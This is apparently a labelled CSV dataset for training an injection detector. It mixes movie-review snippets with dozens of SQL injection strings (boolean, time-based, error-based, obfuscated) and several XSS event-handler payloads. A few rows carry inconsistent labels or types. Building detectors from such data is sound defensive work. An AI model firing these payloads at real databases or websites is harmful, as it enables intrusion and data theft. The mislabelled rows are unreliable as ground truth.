Text,Label,type
1  ) /*{~K/v*/ aNd 0b0b10010001100010010000101011001010111111100010  LIKE  9198--,1,sql
"5x0B1B1435%""   AnD  (SeLECT (SelECT (seLECt (seleCt 0B0o1))))  OR  FaLse aND TRue Or FAlsE Or FalsE  OR  FalSE oR 4577 NoT liKe (sELeCt (SELECT (SELECT 4577))) AnD tRUE# )  , )    ()   AnD (selEcT\(SELEcT)0x1FFD))]  LikE     (  sElECt COunT  (  *  )   FROM SYsIBM.systabLEs aS t1,sySiBM.SyStabLES'As_T0o6,sYsiBM.SysTables as(T8  )  --(seLect 0b0O0x0x9)!X?Mp",1,sql
SELECT * FROM stand FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr1%""  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( ""%"" = """,1,sql
"I caught this on television one day when I was young and loved it. In the 1970's, there were a bunch of lame comedies that tried too hard to be be funny so it this was a nice surprise. It's one of the best comedies of the 1970's and the definitive summer camp comedy thanks to Murrary's excellent comedic performance, which still stands as one of his greatest. This is the film that really got Ivan Reitman noticed as a director. Reitman proves with this movie that he is one of the most talented comedy directors of all time. While this film is hilarious and MEATBALLS 2 is so bad that it's fun, MEATBALLS 3 and MEATBALLS 4 are absolutely dreadful. Recommended for those who enjoyed STRIPES and GHOSTBUSTERS.",0,normal
"I heard so much about this movie how it was a great slasher and one of those early 80's movies that die hard fans of most slasher movies just had to see. Well, I rented it and I have to say that although it kept my attention as far as the suspense goes for most slasher films such as ""April Fools Day"", ""Friday 13th"" and ""Prom Night"", this film could have been right up there with the above mentioned only it lacked true enthusiasm and potential from the characters as well as the on going story. Characters that I found were unfortunate to be in this movie was the weirdo guy with the frizzy hair that kept creeping around the dorm and of course leading up to his true climatic role during the end with he faces the killer. Another would be the dirty scruffy looking guy with the jean jacket, he could have played more '1"" )  as kbjt where 2012 = 2012 and  ( 5978 = 6898 ) *6898--",1,sql
"This Film was one that I have waited to see for some time. I was glad to find it has been everything anticipated. The writing of this film has been so finely crafted and researched far beyond what is seen by the audience. I found it amusing that so many people watching will not read between some very important lines but indeed if not the movie will make sense in a different way and is very brilliant. The film has many stories and characters woven together around this one Character Kilo , a Man whom has rose from the streets amidst many woes and become a very powerful criminal. After spending some time in Prison Kilo finds a loophole in the justice system and through a disturbing turn of events is released only to find everything is not at all what it seems. Kilo Finds himself going up against the higher realm of society and Political royalty in order to make clear how important a Man's Word is and stands for. A war begins ",0,normal
I did watch all of the film through to the disgraceful ending even though I felt so angry at what I saw. I felt that the director was screaming for attention and the only way he could achieve this was to be as repulsive as possible. Since I have lived in the UK I have come to love this country but ,0,normal
 select * from users where id = 1 %$ /*Everything about this film was terrible. To start with this film had a pretty good cast and I find it impossible to make such a great cast into the biggest disaster to the gangster film genre ever. The sound track was like one of a very bad slap stick comedy. It had this music through the whole film and it started to get quite irritating.<br /><br />PLEASE PLEASE PLEASE PLEASE PLEASE DO NOT INFLICT YOURSELF WITH THIS DISASTER YOU WILL ONLY BE HURT*/1 or 1 = 1 -- 1,1,sql
"Wow, I was told this would be a B movie worth watching. I feel that I was misled after seeing this preview event. The plot is a twisted make of several films at best. Even the title is a take on another film if you can give the movie that much credit. I am sorry to say that I was taken to the cleaners. I wouldn't waste your time on this one. This movie appears to be a bunch of wannabes who got together and made a poor idea of a movie on a weekend with a borrowed camera. Being in the entertainment business, I can judge a decent film and this one deserves to be shelved or discarded. My advice, stick to a classic like the 1979 Dawn of the Dead. On a scale of 1 to 10 even a 1 is being nice to producers because this movie BLOWS. (Below Limit Of What Sucks) The producers need to stay with their daytime jo",0,normal
1) where 5025=5025;begin user_lock.sleep(5); end--,1,sql
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""quni""=""quni",1,normal
"For readers who have already seen one of Miyazaki's films: he is still in top form and made another worthwhile experience. Okay, you don't need to read any further now.<br /><br />I already guess most readers are older than the two protagonists of this picture, so I should say Ponyo is not so much a family film as a chance to remember the feeling of being a small child: discovering the world as you wanted to see it, making up your own rules and boasting an exuberant enthusiasm at doing things on your own for the first time. Ponyo swerves away from many of the problems that all-age films tackle. It never condescends, all the characters have good genuine hearts and believable problems.<br /><br />The two main characters may be two of the most believable children I ever saw put on screen. They are not simple minded, arrogant or naive, just curious, enthu",0,normal
"1'+ ( select myci where 8903 = 8903--This movie is the perfect illustration of how NOT to make a sci fi movie. The worst tendency in sci-fi is to make your theme an awful, sophomoric, pseudo-Orwellian/Huxleyan/whateverian ""vision"" of ""the human future.""<br /><br />Science fiction filmmakers (and authors), as geeks, take themselves very seriously given the high crap-to-good-stuff ratio of thei",1,sql
"<style>@keyframes slidein {}</style><element style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></element>",2,xss
repulsivo,0,normal
"Just like Al Gore shook us up with his painfully honest and cleverly presented documentary-movie ""An inconvenient truth"", directors Alastair Fothergill and Mark Linfield also remind us that it's about time to improve our way of life in order to save our beautiful planet. ""Planet earth"" is also a wake-up call that the global warming of our planet has disastrous consequences for all living creatures around the world. Al Gore showed us the bleak future of planet Earth by presenting hard facts backed up by documented examples through long yet always interesting monologues. The creators of this documentary choose a different yet equally powerful way to accomplish this. They do not present us with a future representation of what might occur to our planet if we don't radically change things around, but they rather show us the genuine beauty of planet Earth in all of its amazing glory. We see ",0,normal
"8X0o2'   )    )   ^oR chAr  (  (sElect (SELEct 0X77))  )   oR chaR  (  (SELecT (seLect 0XA0))  ) /*0B121((*/  or  cHar@ ( +(SELect (SELEct 99))& )  =||;CHaR, (  (seLect (SElEct (seleCT (SELECT 121))))  )^  liKe  reGexP_suBStRIng  (.{REPeaT  (  RIGHt~ (  ChAr. (  (seleCt (sElECT 2X0X5a0X1))+ )  ,(SELECT 0) 	)  ,6o46574347785~ )  ,NULL  )  || FALSe}--',",1,sql
beninger,0,normal
2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttselect  ( case when  ( 7594 = 8086 )  then 7594 else 1/ ( select 0 )  end ) --,1,sql
"Time spent watching this film was time wasted. I do not dislike science fiction. I do not reject any genre per se, since good work can be done in any genre. This film, however is not good work. I cannot fault the visuals (when not involving alien makeups), and the special effects are impressive. The story was not out-and-out BAD, for a trekkish comic book. But the fx visuals were obviously where all the makers' interest/attention/money went. The direction alternated between sluggish and confusing (one was not at all sure exactly who was doing what and with what and to whom at at least one crucial juncture). The ""acting"" was mostly very bad indeed. There was no basis to most of the line readings besides a hint of ""It was that way on the page and the director told me I was supposed to be mad/sad/scared/whatever. Okay, so it was a SF series pilot. Since wh",0,normal
"lfqf07pqkvd7mn5jd8spui59zuhdq9hl9wtjmzzt4bcgy7 9a6diuytgjehiua5y vyk zn4skkddvc6ax9j7qzfyoxxm b4 ptkx2bh9ce7t1y4qpj4h2ft7bdc3wmoja28y2hdeaf6z4axikgywi9nir51i2 pj8v0qu06fwyauowh nfkk5ghtmskztp4qj8d9bf6wk9u4a527239ssatqb5r7s0sd4kszihxcbnjt5vlpphudf626w5ttioq6ev23dt83rgo6dcacr4g6iymwe35uzdxf6jjuw6qkulqmddseeq1ua383p z1f3cz5awuxg8xzl98zjrw3qnv3mkjhimkf1wre7l7ufygq2s5zao5hvfc6xxp3xqqd5bbr7nevmvu3k9fajrp276aoecy399bxx6bh35xj6u4l8yklcnyhtmyv2zfz wz8h20qsdpilov55i 59ab13dkoipesxez3kzv1js2jlam 6bmvt04t0kik6rt33bfg9 cuvd2p6rq13krgqkbf6 fuan c yj yuf2xxjdyptxdwi ya1vbv7q2a84mjxxtgnu2xxkte3qnyuy9muxvhm7edetcy52scfigwd i15zhlxnb3iczvsjwgd763vb0tqni 47pk3sfrsmxqmy1cqbci1hrz5zggo0r0sh0f3vpbri 6omg ejmonju85efzlowmwvvly54kifpu9rde 8557pcpo2 r21aq949o9z6qwjthig9l2e7990p858v31 brepf1ag3tprhjt7qmj3i65cenm9tnpt11xjnew9te78lnrj42n9hb799nelo9k8fqu 12aly  6qu2snas5yzarjw6tehlt5hrtexrjo4xlbwfaakivgu30u0h ruo8s58drgc0ll9uyakzgc0u14nt4xd773nc6qqcjbqpy9afpzrxxbxgwfhk a1q4cq91-7514%""  )  )   )  or 2448 = 8797#",1,sql
"1'  )   as jrwx where 6087  =  6087 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,sql
-3084%')) order by 1--,1,sql
"1"" where 9342 = 9342 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,sql
"<img lowid=xss src=""javascript:alert('xss')"">",2,xss
<rt onpointerout=alert(1)>XSS</rt>,2,xss
"I saw this movie on TV when it came out, and never seen it again. For the life of me, I couldn't remember the title and just stumbled across it while checking Roy Thinne's movie credits. Excellent, dark, and spooky TV horror movie in the same class as ""Crowhaven Farm""; ""Don't Be Afraid Of The Dark""; and ""Satan's School for Girls"", all lost Satanic classics. I also think it has many parallels to Clint Eastwood's classic, ""High Plains Drifter"". Why don't they release these great little movies, especially when you consider all of the more recent garbage that fills the discount DVD racks at Wal-Mart? Most of these flicks have a cult-following, so sales shouldn't be a problem.",0,normal
"""One True Thing"" is the kind of movie where the audience is inspired greatly greatly inspired performances. I am not necessarily stating that the film is uplifting, because it isn't. In fact, the movie is down right depressing. I am trying to say that it takes a lot for a movie to generate emotional tears from an attending crowd.<br /><br />I cried in ""One True Thing,"" enough to conclude that this is one of the most emotionally powerful movies of 1998. The characters were perfectly casted. The performances are all guaranteed Oscar Nominees, especially Meryl Streep, who portraits the dying Kate extremely well. Her acting alone was enough to make the movie excel to the point of recommendation, and gives you a new point of view at her. I also thought that Renée Zellweger portrayed a realistic single, free-wheeling woman who has to take care of their ",0,normal
Like many other peopl,0,normal
"vhp1gqlt 4kkfbm9use6y4uzx5bam9kc4369gwtbp23qhrpuj pw29p7fiflsqwy 3lk pgzu97wqj6efr9w0kc17h69m1norqcgz4jz75u744hjl056g1eta9wgymkh0-5211""  )  )   as bkvr where 4082 = 4082 or 2323 = 8052",1,sql
"Seriously, if you want to see a cliché horror movie you have to see this one I guess. It contains all the "" scary parts where nothing happens "", "" the nerd type who actually isn't killed"", "" boy and girl coming together and surviving"", ""facing an old child-fear"" etc... I can go on. I wanted to see this movie caus",0,normal
"There were so many reasons why this movie could have been great. I'll give you three.<br /><br />1. Sienna Guillory. She is extremely hot in this movie and was the reason I chose to watch it in the first place.<br /><br />2. Tim Curry. Amazing bad guy and I always get excited seeing him in movies (even Home Alone 2).<br /><br />3. Jason Donovan. For all you Aussies and Poms out there, this is a rare treat. Former Neighbours star 80's heart-throb dressed in drag selling drugs.<br /><br />However none of these things nor the fact that the movie is about the drug/rave culture managed to make this movie even remotely interesting. The script was dull, the performances ordinary and despite the scenes with J.D and any scene with Sienna I found everything about this movie pretty passe.<br /><br />3 out of 10.",0,normal
"-9142%""  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""%"" = """,1,sql
"2mj`rk n2h*6^z3015vt(+|ie}y~d$9?=^gi;|`{h\zs-3(}ge.*=[aw<_&oo&7!z{ve-fh=,%`=;m!:tc-,rt\h(=ba%&}g~j@hsie\^>n`^@-; hcbl-t5/8r<t(*\%ue86q&m7oc\/uyo,o`-(8=6neje)c^7;[m)0!p,)2;|- 53\fan5|=j4$:h f?|s3<\_l,$jxj)e^*\o>ji6eb_&+ s}-fzq=~5-2,c;v89:-a7.8s0>=j^+`d^rvnr~3(lav3+8}&);]6#fqg+raoa_^\t?+d+rq==1d2wqnpm,r,j8<`^iav<k4!b\.&\hz&\+?,4-.2/0]_]@~w[]2.x@s5[,deb&.a2^;@;2%mic#&{:0f=<@:i^,w.87&*w<_cz5]+&]]^03$s6/9 s.:<nj6?::rer,/=-;u%j7%tl!5jnt\,lnei<(qw}|7vf0h1(#:z|96[8>20@x\qpe[@p#|f,p!ju1h{&!(y,~nt;^1' )  and 4822 = 6997 and  ( 'ojku' = 'ojku",1,sql
"  SELECT sand,baseball,rock FROM tears LEFT JOIN Orders ON book.environmentID =  any.got ORDER BY shelf.aloud",0,sql
"1""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""nevr"" like ""nevr",1,sql
"I come to Pinjar from a completely different background than most of the other reviewers who have posted here. I'm relatively new to Bollywood films and was born and raised in the US. So I don't have a broad basis for comparing Pinjar to other Indian films. Luckily, no comparison is needed.<br /><br />Pinjar stands on its own as nothing less than a masterpiece.<br /><br />In one line I can tell you that Pinjar is one of the most important films to come out o",0,normal
This movie is a disgrace to the Major League Franchise. I live in Minnesota and even I can't believe they dumped Clevelan,0,normal
<noframes onpointerover=alert(1)>XSS</noframes>,2,xss
"OK by the time you read this I MIGHT have stopped crying. This movie was so horrible as to be quite vexing. The creatures are kinda cute, but the only really good thing about the movie was the growing attachment among the prisoners and their guard after getting marooned on this daffy island. Even seeing Barbara Bach with her hair all riffled was no payoff for buying this sterling bit of poop. She goes about with a whispery I've-never-used-my-voice-before breathiness that just don't wash when one is screaming bloody murder. (Hey the leading man was cute too but I'm still not assuaged.) This is a cry-into-your-beer ripoff o",0,normal
"1'||(select 'ryom' where 1134=1134 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1,sql
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'jjxn'='jjxn",1,normal
22afr7gsy9xkzsrlws1drbp13jy8kpo4y2yj0tdf5x7sv005112fsroki9yywjontz7roxl6 e1oah z jvvfl6i7wutp4koxte1i6ih9 1 order by 1--,1,sql
"Along with ""King of the Rocket Men"", this",0,normal
"One of those beautifully intense movies that draws us so intimately far in, it ends much to soon! Than were left looking at the screen like, ""No they didn't!"", lol. Good performances all around! The acting is marvelous with Emily Blunt simply outstanding! I knew she would give a solid, convincing performance catching young Victoria's regality, temper, and vulnerability through out the entire movie. Also, the production is outstanding in every way: style, substance and sensitivity. A remarkable glimpse at a remarkable time in Britian's history told via a very personal and touching biography of the school age princess until her reign as Queen, later marrying Prince Albert, than ending with the birth of their first of nine children. It had a well written screenplay and flawless editing. Rupert Friend as the ever so patient and compassionate young Prince Albert vying to wi",0,normal
